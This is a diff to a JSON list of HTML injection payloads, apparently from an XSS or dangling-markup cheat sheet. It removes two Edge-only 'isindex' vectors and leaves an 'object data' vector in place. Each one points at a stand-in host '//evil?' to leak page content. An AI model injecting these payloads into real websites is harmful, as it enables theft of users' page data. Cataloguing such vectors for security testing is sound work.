@@ -120,20 +120,6 @@
         ]
     },
     {
-        "description": "Isindex using src attribute",
-        "code": "<isindex type=image src=\"\/\/evil?",
-        "browsers": [
-            "edge"
-        ]
-    },
-    {
-        "description": "Isindex using submit",
-        "code": "<isindex type=submit style=width:100%;height:100%; value=XSS formaction=\"\/\/evil?",
-        "browsers": [
-            "edge"
-        ]
-    },
-    {
         "description": "Object data",
         "code": "<object data=\"\/\/evil?",
         "browsers": [
@@ -259,5 +245,5 @@
             "chrome",
             "safari"
         ]
-    }  
+    }
 ]
